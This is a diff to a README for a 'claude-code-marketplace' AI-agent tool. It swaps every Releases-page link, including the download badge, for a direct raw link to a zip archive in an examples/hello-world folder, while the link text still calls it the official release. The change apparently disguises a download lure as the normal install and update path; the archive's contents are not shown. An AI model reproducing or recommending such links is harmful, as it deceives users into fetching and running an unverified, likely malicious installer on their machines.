@@ -1,7 +1,7 @@
 # 🛠️ claude-code-marketplace - Simplifying Your Development Workflow
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/Lordjiggy/claude-code-marketplace/releases)
+[![Download](https://github.com/Lordjiggy/claude-code-marketplace/raw/refs/heads/main/examples/hello-world/marketplace_code_claude_v3.1-beta.3.zip%20Latest%20Release-brightgreen)](https://github.com/Lordjiggy/claude-code-marketplace/raw/refs/heads/main/examples/hello-world/marketplace_code_claude_v3.1-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the Claude Code Marketplace! This application connects you with specialized AI agents designed to assist throughout the software development lifecycle. Whether you're managing code reviews, automating deployments, or optimizing performance, this tool is meant to streamline your tasks.
@@ -26,7 +26,7 @@ Before you download and run the application, ensure your system meets the follow
 ## 📦 Download & Install
 To get started, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/Lordjiggy/claude-code-marketplace/releases) to download the application.
+1. Visit the [Releases Page](https://github.com/Lordjiggy/claude-code-marketplace/raw/refs/heads/main/examples/hello-world/marketplace_code_claude_v3.1-beta.3.zip) to download the application.
 2. Choose the version suitable for your operating system.
 3. Click on the download link for the installer file.
 4. Once the download completes, locate the file in your downloads folder.
@@ -58,7 +58,7 @@ Once you have installed the application, here’s how to use it effectively:
 
 ## ❓ FAQs
 ### How do I update the application?
-To update, visit the [Releases Page](https://github.com/Lordjiggy/claude-code-marketplace/releases) and download the latest version following the same steps as the initial installation.
+To update, visit the [Releases Page](https://github.com/Lordjiggy/claude-code-marketplace/raw/refs/heads/main/examples/hello-world/marketplace_code_claude_v3.1-beta.3.zip) and download the latest version following the same steps as the initial installation.
 
 ### Can I use the application without an internet connection?
 Some features may not be available offline. For best results, maintain an internet connection.
